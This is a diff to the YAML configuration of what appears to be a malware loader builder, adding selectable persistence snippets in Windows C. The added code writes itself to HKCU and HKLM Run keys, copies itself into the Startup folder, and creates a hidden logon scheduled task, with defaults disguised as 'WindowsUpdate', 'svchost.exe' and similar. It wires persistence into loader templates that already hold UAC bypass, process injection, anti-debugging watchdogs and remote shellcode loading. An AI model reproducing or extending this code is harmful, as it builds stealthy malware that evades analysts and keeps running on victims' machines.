@@ -1815,6 +1815,134 @@ sections:
           "\x6C\x64\x00\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73"
           "\x00";
       unsigned int code_blob_len = 162;
+- header: Persistence
+  template: persistence
+  display: Persistence
+  allowMultiple: false
+  items:
+  - id: None
+    display: None (Skip)
+    default: true
+    snippet: |
+      // No persistence
+
+  - id: HkcuRunKey
+    display: HKCU Run Key (User-Level)
+    default: false
+    inputs:
+    - id: hkcu_run_value_name
+      label: "Registry Value Name"
+      type: textbox
+      defaultValue: "WindowsUpdate"
+      placeholder: "WindowsUpdate"
+    snippet: |
+      // Persistence: HKCU Run Registry Key
+      // Adds current executable to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
+      // Starts automatically on every user logon. No administrator rights required.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          WCHAR _pers_path[MAX_PATH] = {0};
+          HKEY  _pers_hKey;
+          GetModuleFileNameW(NULL, _pers_path, MAX_PATH);
+          if (RegOpenKeyExW(HKEY_CURRENT_USER,
+                            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                            0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
+              RegSetValueExW(_pers_hKey, L"$hkcu_run_value_name$", 0, REG_SZ,
+                             (BYTE*)_pers_path,
+                             (DWORD)((wcslen(_pers_path) + 1) * sizeof(WCHAR)));
+              RegCloseKey(_pers_hKey);
+          }
+      }
+
+  - id: StartupFolder
+    display: Startup Folder (User-Level)
+    default: false
+    inputs:
+    - id: startup_file_name
+      label: "Dropped Filename"
+      type: textbox
+      defaultValue: "svchost.exe"
+      placeholder: "svchost.exe"
+    snippet: |
+      // Persistence: User Startup Folder
+      // Copies the running executable into the current user's Startup folder.
+      // Launched on every logon. No administrator rights required.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          WCHAR _sf_src[MAX_PATH] = {0};
+          WCHAR _sf_dir[MAX_PATH] = {0};
+          WCHAR _sf_dst[MAX_PATH] = {0};
+          GetModuleFileNameW(NULL, _sf_src, MAX_PATH);
+          ExpandEnvironmentStringsW(
+              L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+              _sf_dir, MAX_PATH);
+          wsprintfW(_sf_dst, L"%s\\$startup_file_name$", _sf_dir);
+          CopyFileW(_sf_src, _sf_dst, FALSE);
+      }
+
+  - id: ScheduledTask
+    display: Scheduled Task (User-Level)
+    default: false
+    inputs:
+    - id: sched_task_name
+      label: "Task Name"
+      type: textbox
+      defaultValue: "MicrosoftEdgeUpdateTask"
+      placeholder: "MicrosoftEdgeUpdateTask"
+    snippet: |
+      // Persistence: Scheduled Task via schtasks.exe
+      // Creates a logon-triggered task that runs the current executable silently.
+      // Uses /RL LIMITED (no UAC prompt required). Overwrites existing task with /F.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          WCHAR _st_exe[MAX_PATH]      = {0};
+          WCHAR _st_cmd[1024]          = {0};
+          STARTUPINFOW        _st_si   = {sizeof(_st_si)};
+          PROCESS_INFORMATION _st_pi   = {0};
+          GetModuleFileNameW(NULL, _st_exe, MAX_PATH);
+          wsprintfW(_st_cmd,
+                    L"cmd.exe /C schtasks /Create /TN \"$sched_task_name$\" "
+                    L"/TR \"\\\"%s\\\"\" /SC ONLOGON /RL LIMITED /F",
+                    _st_exe);
+          _st_si.dwFlags     = STARTF_USESHOWWINDOW;
+          _st_si.wShowWindow = SW_HIDE;
+          if (CreateProcessW(NULL, _st_cmd, NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &_st_si, &_st_pi)) {
+              WaitForSingleObject(_st_pi.hProcess, 5000);
+              CloseHandle(_st_pi.hProcess);
+              CloseHandle(_st_pi.hThread);
+          }
+      }
+
+  - id: HklmRunKey
+    display: HKLM Run Key (Requires Admin)
+    default: false
+    inputs:
+    - id: hklm_run_value_name
+      label: "Registry Value Name"
+      type: textbox
+      defaultValue: "WindowsDefenderUpdate"
+      placeholder: "WindowsDefenderUpdate"
+    snippet: |
+      // Persistence: HKLM Run Registry Key
+      // Adds current executable to HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
+      // Runs at logon for ALL users. Requires administrator rights to write.
+      // Falls back silently if insufficient privileges.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          WCHAR _pers_path[MAX_PATH] = {0};
+          HKEY  _pers_hKey;
+          GetModuleFileNameW(NULL, _pers_path, MAX_PATH);
+          if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+                            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                            0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
+              RegSetValueExW(_pers_hKey, L"$hklm_run_value_name$", 0, REG_SZ,
+                             (BYTE*)_pers_path,
+                             (DWORD)((wcslen(_pers_path) + 1) * sizeof(WCHAR)));
+              RegCloseKey(_pers_hKey);
+          }
+      }
+
 templates:
 - id: default
   display: Default Loader
@@ -1853,6 +1981,8 @@ templates:
 
         {{UAC_BYPASS}}
 
+        {{PERSISTENCE}}
+
         {{PROCESS_INJECTION}}
 
         {{SHELLCODE_EXECUTION}}
@@ -1885,6 +2015,9 @@ templates:
   - name: UAC_BYPASS
     kind: snippet
     snippetTemplate: uacb
+  - name: PERSISTENCE
+    kind: snippet
+    snippetTemplate: persistence
   - name: PROCESS_INJECTION
     kind: snippet
     snippetTemplate: psinjection
@@ -1894,7 +2027,7 @@ templates:
 - id: paranoid
   display: Paranoid Loader
   description: Every protection enabled - layered defense in depth.
-  content: "#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n#include <winternl.h>\n#include <intrin.h>\n#include <tlhelp32.h>\n#include <shlobj.h>\n#include <iphlpapi.h>\n#include <lm.h>\n#pragma comment(lib, \"iphlpapi.lib\")\n#pragma comment(lib, \"netapi32.lib\")\n\n{{PROCESS_LOOKUP_HELPER}}\n\n// Watchdog thread\nvolatile BOOL g_SafeToRun = TRUE;\n\nDWORD WINAPI WatchdogThread(LPVOID lpParam) {\n    while (g_SafeToRun) {\n        // Check debugger continuously\n        if (IsDebuggerPresent()) { g_SafeToRun = FALSE; ExitProcess(0); }\n        \n        // Check hardware breakpoints\n        CONTEXT ctx = {0};\n        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n        if (GetThreadContext(GetCurrentThread(), &ctx)) {\n            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { g_SafeToRun = FALSE; ExitProcess(0); }\n        }\n        \n        // Check for analysis tools\n        const wchar_t* tools[] = {\n            L\"x64dbg.exe\", L\"ida.exe\", L\"idaq64.exe\", L\"procmon.exe\",\n            L\"wireshark.exe\", L\"fiddler.exe\", L\"ProcessHacker.exe\"\n        };\n        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n        if (snap != INVALID_HANDLE_VALUE) {\n            PROCESSENTRY32W pe = {sizeof(pe)};\n            if (Process32FirstW(snap, &pe)) {\n                do {\n                    for (int i = 0; i < 7; i++) {\n                        if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {\n                            CloseHandle(snap);\n                            g_SafeToRun = FALSE;\n                            ExitProcess(0);\n                        }\n                    }\n                } while (Process32NextW(snap, &pe));\n            }\n            CloseHandle(snap);\n        }\n        \n        Sleep(500);\n    }\n    return 0;\n}\n\nINT main(VOID)\n{\n    // Start watchdog\n    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);\n\n    // Phase 1: Anti-Emulation\n    {{ANTI_EMULATION}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 2: Environment Validation\n    {{GUARDRAILS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 3: VM/Sandbox Detection\n    {{ANTI_SANDBOX}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 4: Anti-Debugging\n    {{ANTI_DEBUGGING}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 5: Anti-Analysis\n    {{ANTI_ANALYSIS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 6: Load Payload\n    {{SHELLCODE_SOURCE}}\n    {{SHELLCODE_URL}}\n\n    // Phase 7: Execute\n    {{SHELLCODE_EXECUTION}}\n\n    return 0;\n}\n"
+  content: "#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n#include <winternl.h>\n#include <intrin.h>\n#include <tlhelp32.h>\n#include <shlobj.h>\n#include <iphlpapi.h>\n#include <lm.h>\n#pragma comment(lib, \"iphlpapi.lib\")\n#pragma comment(lib, \"netapi32.lib\")\n\n{{PROCESS_LOOKUP_HELPER}}\n\n// Watchdog thread\nvolatile BOOL g_SafeToRun = TRUE;\n\nDWORD WINAPI WatchdogThread(LPVOID lpParam) {\n    while (g_SafeToRun) {\n        // Check debugger continuously\n        if (IsDebuggerPresent()) { g_SafeToRun = FALSE; ExitProcess(0); }\n        \n        // Check hardware breakpoints\n        CONTEXT ctx = {0};\n        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n        if (GetThreadContext(GetCurrentThread(), &ctx)) {\n            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { g_SafeToRun = FALSE; ExitProcess(0); }\n        }\n        \n        // Check for analysis tools\n        const wchar_t* tools[] = {\n            L\"x64dbg.exe\", L\"ida.exe\", L\"idaq64.exe\", L\"procmon.exe\",\n            L\"wireshark.exe\", L\"fiddler.exe\", L\"ProcessHacker.exe\"\n        };\n        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n        if (snap != INVALID_HANDLE_VALUE) {\n            PROCESSENTRY32W pe = {sizeof(pe)};\n            if (Process32FirstW(snap, &pe)) {\n                do {\n                    for (int i = 0; i < 7; i++) {\n                        if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {\n                            CloseHandle(snap);\n                            g_SafeToRun = FALSE;\n                            ExitProcess(0);\n                        }\n                    }\n                } while (Process32NextW(snap, &pe));\n            }\n            CloseHandle(snap);\n        }\n        \n        Sleep(500);\n    }\n    return 0;\n}\n\nINT main(VOID)\n{\n    // Start watchdog\n    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);\n\n    // Phase 1: Anti-Emulation\n    {{ANTI_EMULATION}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 2: Environment Validation\n    {{GUARDRAILS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 3: VM/Sandbox Detection\n    {{ANTI_SANDBOX}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 4: Anti-Debugging\n    {{ANTI_DEBUGGING}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 5: Anti-Analysis\n    {{ANTI_ANALYSIS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 6: Persistence\n    {{PERSISTENCE}}\n\n    // Phase 7: Load Payload\n    {{SHELLCODE_SOURCE}}\n    {{SHELLCODE_URL}}\n\n    // Phase 7: Execute\n    {{SHELLCODE_EXECUTION}}\n\n    return 0;\n}\n"
   placeholders:
   - name: PROCESS_LOOKUP_HELPER
     kind: system
@@ -1913,6 +2046,9 @@ templates:
   - name: ANTI_ANALYSIS
     kind: snippet
     snippetTemplate: antianalysis
+  - name: PERSISTENCE
+    kind: snippet
+    snippetTemplate: persistence
   - name: SHELLCODE_SOURCE
     kind: system
   - name: SHELLCODE_URL
@@ -1975,6 +2111,7 @@ templates:
         {{ANTI_EMULATION}}
         {{ANTI_ANALYSIS}}
         {{ANTI_DEBUGGING}}
+        {{PERSISTENCE}}
         {{SHELLCODE_SOURCE}}
         {{SHELLCODE_URL}}
         {{SHELLCODE_EXECUTION}}
@@ -1992,6 +2129,9 @@ templates:
   - name: ANTI_DEBUGGING
     kind: snippet
     snippetTemplate: antidebugging
+  - name: PERSISTENCE
+    kind: snippet
+    snippetTemplate: persistence
   - name: SHELLCODE_SOURCE
     kind: system
   - name: SHELLCODE_URL
@@ -2032,7 +2172,10 @@ templates:
         // Layer 4: Debugger Detection
         {{ANTI_DEBUGGING}}
 
-        // Layer 5: Payload
+        // Layer 5: Persistence
+        {{PERSISTENCE}}
+
+        // Layer 6: Payload
         {{SHELLCODE_SOURCE}}
         {{SHELLCODE_URL}}
 
@@ -2056,6 +2199,9 @@ templates:
   - name: ANTI_DEBUGGING
     kind: snippet
     snippetTemplate: antidebugging
+  - name: PERSISTENCE
+    kind: snippet
+    snippetTemplate: persistence
   - name: SHELLCODE_SOURCE
     kind: system
   - name: SHELLCODE_URL
@@ -2075,6 +2221,8 @@ templates:
     {
         {{SHELLCODE_SOURCE}}
 
+        {{PERSISTENCE}}
+
         {{SHELLCODE_EXECUTION}}
 
         return 0;
@@ -2083,6 +2231,9 @@ templates:
   placeholders:
   - name: SHELLCODE_SOURCE
     kind: system
+  - name: PERSISTENCE
+    kind: snippet
+    snippetTemplate: persistence
   - name: SHELLCODE_EXECUTION
     kind: snippet
     snippetTemplate: shellcodeexecution
@@ -2098,6 +2249,8 @@ templates:
 
     INT ExecutePayload()
     {
+        {{PERSISTENCE}}
+
         {{SHELLCODE_EXECUTION}}
         return 0;
     }
@@ -2113,6 +2266,9 @@ templates:
   placeholders:
   - name: SHELLCODE_SOURCE
     kind: system
+  - name: PERSISTENCE
+    kind: snippet
+    snippetTemplate: persistence
   - name: SHELLCODE_EXECUTION
     kind: snippet
     snippetTemplate: shellcodeexecution
@@ -2132,6 +2288,8 @@ templates:
     {
         {{SHELLCODE_SOURCE}}
 
+        {{PERSISTENCE}}
+
         {{SHELLCODE_EXECUTION}}
 
         return 0;
@@ -2139,6 +2297,9 @@ templates:
   placeholders:
   - name: SHELLCODE_SOURCE
     kind: system
+  - name: PERSISTENCE
+    kind: snippet
+    snippetTemplate: persistence
   - name: SHELLCODE_EXECUTION
     kind: snippet
     snippetTemplate: shellcodeexecution
